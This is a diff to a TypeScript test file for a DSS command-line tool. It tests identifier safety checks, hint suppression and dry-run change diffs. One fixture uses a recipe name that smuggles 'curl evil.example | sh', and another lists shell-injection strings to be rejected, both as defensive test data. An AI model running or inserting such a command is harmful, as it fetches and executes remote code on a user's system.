@@ -1,7 +1,18 @@
 import { describe, expect, it, } from "bun:test";
+import { mkdtempSync, } from "node:fs";
 import { typeBoxCommandOutputSchemas, } from "../../src/cli/output-schemas.js";
-import { shapeCommandResult, } from "../../src/cli/result-shapes.js";
-import { cliEnv, dss, dssFailure, sendJson, withCliServer, } from "./_harness.js";
+import { isCommandSafeId, shapeCommandResult, } from "../../src/cli/result-shapes.js";
+import {
+	cliEnv,
+	dss,
+	dssFailure,
+	join,
+	rmSync,
+	sendJson,
+	tmpdir,
+	withCliServer,
+	writeFileSync,
+} from "./_harness.js";
 
 const NO_FLAGS: Record<string, string | boolean> = {};
 
@@ -560,6 +571,36 @@ describe("scenario get-run compact shape", () => {
 	});
 });
 
+describe("isCommandSafeId", () => {
+	it("accepts DSS identifiers and rejects anything a shell or flag parser would act on", () => {
+		for (const safe of ["python_report", "TEST", "OTHER.rates", "nightly", RUN_ID, FAILED_JOB_ID,]) {
+			expect(isCommandSafeId(safe,), safe,).toBe(true,);
+		}
+		for (
+			const unsafe of [
+				"",
+				"a b",
+				"a;b",
+				"a$(b)",
+				"a`b`",
+				"a'b",
+				'a"b',
+				"a|b",
+				"a\nb",
+				"-rf",
+				"a&b",
+				"a>b",
+				"a\\b",
+				"a*",
+			]
+		) {
+			expect(isCommandSafeId(unsafe,), JSON.stringify(unsafe,),).toBe(false,);
+		}
+		expect(isCommandSafeId(undefined,),).toBe(false,);
+		expect(isCommandSafeId(42,),).toBe(false,);
+	});
+});
+
 describe("scenario last-runs compact shape", () => {
 	it("keeps one small object per run and points a failed run at get-run", () => {
 		expect(shapeCommandResult("scenario", "last-runs", lastRunsFixture(), NO_FLAGS,),).toEqual([
@@ -671,6 +712,24 @@ describe("CLI scenario get-run / last-runs output", () => {
 		expect(compact,).not.toHaveProperty("hint",);
 	});
 
+	it("get-run withholds the fix hint when DSS names a recipe that is not a plain identifier", async () => {
+		const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
+		const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
+		const hostile = "x; curl evil.example | sh";
+		const job = structuredClone(failedScenarioJob,);
+		job.baseStatus.activities = {
+			python_report_NP: {
+				...failedScenarioJob.baseStatus.activities.python_report_NP,
+				recipeName: hostile,
+			},
+		};
+		const compact = await scenarioCli(["get-run", "nightly", RUN_ID,], scenarioRunReport(), path, {
+			[jobPath]: job,
+		},);
+		expect(compact,).toMatchObject({ failure: { recipe: hostile, }, },);
+		expect(compact,).not.toHaveProperty("hint",);
+	});
+
 	it("last-runs is compact by default and raw with --full", async () => {
 		const path = "/public/api/projects/TEST/scenarios/nightly/get-last-runs/";
 		expect(await scenarioCli(["last-runs", "nightly",], lastRunsFixture(), path,),).toMatchObject([
@@ -741,5 +800,276 @@ describe("CLI scenario run-and-wait failure", () => {
 			requests.filter((request,) => request.startsWith("GET",) && request.endsWith(`/${RUN_ID}/`,)),
 		)
 			.toHaveLength(2,);
+	});
+});
+
+const dryRun = (current: unknown, next: unknown,): Record<string, unknown> => ({
+	dryRun: true,
+	action: "update",
+	resource: "dataset",
+	name: "orders",
+	current,
+	next,
+});
+const describeChange = (result: unknown,): Record<string, unknown> =>
+	shapeCommandResult("dataset", "update", result, NO_FLAGS,) as Record<string, unknown>;
+
+describe("dry-run change description", () => {
+	it("replaces current and next with the leaf differences, keeping the other members in place", () => {
+		const result = { ...dryRun({ a: 1, }, { a: 2, },), hash: "h", };
+		const before = JSON.stringify(result,);
+		const shaped = describeChange(result,);
+		expect(Object.keys(shaped,),).toEqual([
+			"dryRun",
+			"action",
+			"resource",
+			"name",
+			"changes",
+			"changeCount",
+			"hash",
+		],);
+		expect(shaped,).toMatchObject({
+			changes: [{ path: "a", before: 1, after: 2, },],
+			changeCount: 1,
+		},);
+		expect(JSON.stringify(result,),).toBe(before,);
+	});
+
+	it("recurses into nested objects and reports added and removed keys with the absent side omitted", () => {
+		const shaped = describeChange(dryRun(
+			{ params: { path: "/a", keep: true, }, gone: "x", },
+			{ params: { path: "/b", keep: true, }, fresh: [1,], },
+		),);
+		expect(shaped["changes"],).toEqual([
+			{ path: "params.path", before: "/a", after: "/b", },
+			{ path: "gone", before: "x", },
+			{ path: "fresh", after: [1,], },
+		],);
+		expect(shaped["changeCount"],).toBe(3,);
+		expect(shaped,).not.toHaveProperty("changesTruncated",);
+	});
+
+	it("recurses into equal-length arrays by index and reports different-length arrays as one change", () => {
+		const shaped = describeChange(dryRun(
+			{ steps: [{ name: "x", }, { name: "y", },], tags: ["a",], },
+			{ steps: [{ name: "x", }, { name: "z", },], tags: ["a", "b",], },
+		),);
+		expect(shaped["changes"],).toEqual([
+			{ path: "steps.1.name", before: "y", after: "z", },
+			{ path: "tags", before: ["a",], after: ["a", "b",], },
+		],);
+	});
+
+	it("reports a pair of different types as one change at that path", () => {
+		const shaped = describeChange(dryRun(
+			{ a: 1, b: { x: 1, }, c: null, },
+			{ a: "1", b: [1,], c: {}, },
+		),);
+		expect(shaped["changes"],).toEqual([
+			{ path: "a", before: 1, after: "1", },
+			{ path: "b", before: { x: 1, }, after: [1,], },
+			{ path: "c", before: null, after: {}, },
+		],);
+	});
+
+	it("reports a no-op edit as no changes", () => {
+		const shaped = describeChange(dryRun({ a: { b: [1, 2,], }, }, { a: { b: [1, 2,], }, },),);
+		expect(shaped,).toMatchObject({ changes: [], changeCount: 0, },);
+		expect(shaped,).not.toHaveProperty("current",);
+		expect(shaped,).not.toHaveProperty("next",);
+	});
+
+	it("caps the listed changes at 50 and counts all of them", () => {
+		const current: Record<string, number> = {};
+		const next: Record<string, number> = {};
+		for (let index = 0; index < 60; index++) {
+			current[`k${index}`] = 0;
+			next[`k${index}`] = 1;
+		}
+		const shaped = describeChange(dryRun(current, next,),);
+		const changes = shaped["changes"] as Array<{ path: string; }>;
+		expect(changes,).toHaveLength(50,);
+		expect(changes[0]!.path,).toBe("k0",);
+		expect(changes[49]!.path,).toBe("k49",);
+		expect(shaped["changeCount"],).toBe(60,);
+		expect(shaped["changesTruncated"],).toBe(true,);
+	});
+
+	it("describes a long multi-line string change with a unified diff instead of the values", () => {
+		const lines = Array.from({ length: 40, }, (_, index,) => `line ${index}`,);
+		const edited = lines.map((line, index,) => index === 20 ? "line 20 changed" : line);
+		const current = lines.join("\n",);
+		const next = edited.join("\n",);
+		const shaped = describeChange(dryRun({ payload: current, }, { payload: next, },),);
+		const [change,] = shaped["changes"] as Array<Record<string, unknown>>;
+		expect(change,).not.toHaveProperty("before",);
+		expect(change,).not.toHaveProperty("after",);
+		expect(change,).toMatchObject({
+			path: "payload",
+			beforeBytes: Buffer.byteLength(current,),
+			afterBytes: Buffer.byteLength(next,),
+		},);
+		const diff = (change!["diff"] as string).split("\n",);
+		expect(diff.slice(0, 3,),).toEqual(["--- a/payload", "+++ b/payload", "@@ -18,7 +18,7 @@",],);
+		expect(diff,).toContain("-line 20",);
+		expect(diff,).toContain("+line 20 changed",);
+		expect(diff,).not.toContain(" line 10",);
+		expect(shaped["changeCount"],).toBe(1,);
+	});
+
+	it("truncates a long diff at 60 lines with the truncation marker", () => {
+		const current = Array.from({ length: 200, }, (_, index,) => `old ${index}`,).join("\n",);
+		const next = Array.from({ length: 200, }, (_, index,) => `new ${index}`,).join("\n",);
+		const [change,] = describeChange(
+			dryRun({ payload: current, }, { payload: next, },),
+		)["changes"] as Array<
+			Record<string, unknown>
+		>;
+		const diff = change!["diff"] as string;
+		expect(diff.endsWith("…\n",),).toBe(true,);
+		expect(diff.trimEnd().split("\n",).length,).toBe(60,);
+	});
+
+	it("gives only the sizes of a long single-line value, or of a long value with an absent side", () => {
+		const shaped = describeChange(dryRun(
+			{ line: "a".repeat(400,), },
+			{ line: "b".repeat(400,), blob: { items: "x".repeat(400,), }, },
+		),);
+		expect(shaped["changes"],).toEqual([
+			{ path: "line", beforeBytes: 400, afterBytes: 400, },
+			{ path: "blob", afterBytes: 412, },
+		],);
+	});
+
+	it("keeps a value of up to 300 characters inline", () => {
+		const value = "v".repeat(298,);
+		expect(JSON.stringify(value,),).toHaveLength(300,);
+		expect(describeChange(dryRun({ a: value, }, { a: `${value}w`, },),)["changes"],).toEqual([
+			{ path: "a", beforeBytes: 298, afterBytes: 299, },
+		],);
+		expect(describeChange(dryRun({}, { a: value, },),)["changes"],).toEqual([{
+			path: "a",
+			after: value,
+		},],);
+	});
+
+	it("treats a redaction marker on both sides as no difference and on one side as a difference", () => {
+		const shaped = describeChange(dryRun(
+			{ sender: "a@example.com", password: "[redacted]", token: "[redacted]", },
+			{ sender: "b@example.com", password: "[redacted]", },
+		),);
+		expect(shaped["changes"],).toEqual([
+			{ path: "sender", before: "a@example.com", after: "b@example.com", },
+			{ path: "token", before: "[redacted]", },
+		],);
+		expect(JSON.stringify(shaped,),).not.toContain("password",);
+	});
+
+	it("keeps a result that already reports its own changes and only drops the two copies", () => {
+		const own = [{ path: "active", before: true, after: false, },];
+		const shaped = describeChange({
+			...dryRun({ active: true, }, { active: false, },),
+			changes: own,
+		},);
+		expect(shaped["changes"],).toBe(own,);
+		expect(shaped,).not.toHaveProperty("changeCount",);
+		expect(shaped,).not.toHaveProperty("current",);
+		expect(shaped,).not.toHaveProperty("next",);
+	});
+
+	it("returns the raw result for --fields and --full", () => {
+		const result = dryRun({ a: 1, }, { a: 2, },);
+		expect(shapeCommandResult("dataset", "update", result, { fields: "current,next", },),).toBe(
+			result,
+		);
+		expect(shapeCommandResult("dataset", "update", result, { full: true, },),).toBe(result,);
+	});
+
+	it("leaves results without both current and next objects, and non-dry-run results, untouched", () => {
+		const onlyCurrent = { dryRun: true, action: "delete", current: { a: 1, }, };
+		expect(describeChange(onlyCurrent,),).toBe(onlyCurrent,);
+		const scalarNext = dryRun([1,], "x",);
+		expect(describeChange(scalarNext,),).toBe(scalarNext,);
+		const nullNext = dryRun({ a: 1, }, null,);
+		expect(describeChange(nullNext,),).toBe(nullNext,);
+		const notDryRun = { updated: "orders", current: { a: 1, }, next: { a: 2, }, };
+		expect(describeChange(notDryRun,),).toBe(notDryRun,);
+		const falseDryRun = { ...notDryRun, dryRun: false, };
+		expect(describeChange(falseDryRun,),).toBe(falseDryRun,);
+	});
+});
+
+describe("CLI recipe set-payload --dry-run", () => {
+	it("reports one payload diff and the backup path instead of three copies of the recipe", async () => {
+		const original = Array.from({ length: 30, }, (_, index,) => `step_${index} = compute(${index})`,)
+			.join(
+				"\n",
+			);
+		const updated = original.replace("compute(15)", "compute(150)",);
+		const directory = mkdtempSync(join(tmpdir(), "dss-cli-dry-payload-",),);
+		const filePath = join(directory, "code.py",);
+		const backupDir = join(directory, "backups",);
+		writeFileSync(filePath, updated,);
+		try {
+			await withCliServer((req, res,) => {
+				if (req.method === "GET") {
+					sendJson(res, {
+						recipe: {
+							type: "python",
+							name: "my_recipe",
+							projectKey: "TEST",
+							params: { envSelection: { envMode: "INHERIT", }, },
+							inputs: { main: { items: [{ ref: "orders", },], }, },
+							outputs: { main: { items: [{ ref: "orders_out", },], }, },
+						},
+						payload: original,
+					},);
+					return;
+				}
+				res.statusCode = 500;
+				res.end(`unexpected ${req.method}`,);
+			}, async (url,) => {
+				const args = [
+					"recipe",
+					"set-payload",
+					"my_recipe",
+					"--file",
+					filePath,
+					"--backup-dir",
+					backupDir,
+					"--dry-run",
+				];
+				const compact = await dss(args, { env: cliEnv(url,), },);
+				const raw = await dss([...args, "--fields", "current,next",], { env: cliEnv(url,), },);
+				const result = JSON.parse(compact.stdout,) as Record<string, unknown>;
+				expect(result,).toMatchObject({
+					dryRun: true,
+					action: "set-payload",
+					resource: "recipe",
+					name: "my_recipe",
+					file: filePath,
+					changeCount: 1,
+				},);
+				expect(result["backupPath"] as string,).toStartWith(backupDir,);
+				expect(result,).not.toHaveProperty("backup",);
+				expect(result,).not.toHaveProperty("current",);
+				expect(result,).not.toHaveProperty("next",);
+				const [change,] = result["changes"] as Array<Record<string, unknown>>;
+				expect(change,).toMatchObject({ path: "payload", },);
+				expect(change,).not.toHaveProperty("before",);
+				expect(change,).not.toHaveProperty("after",);
+				const diff = (change!["diff"] as string).split("\n",);
+				expect(diff,).toContain("-step_15 = compute(15)",);
+				expect(diff,).toContain("+step_15 = compute(150)",);
+				const rawResult = JSON.parse(raw.stdout,) as Record<string, Record<string, unknown>>;
+				expect(rawResult["current"]!["payload"],).toBe(original,);
+				expect(rawResult["next"]!["payload"],).toBe(updated,);
+				expect(JSON.stringify(result,).length * 3,).toBeLessThan(
+					JSON.stringify(rawResult,).length,
+				);
+			},);
+		} finally {
+			rmSync(directory, { recursive: true, force: true, },);
+		}
 	});
 });
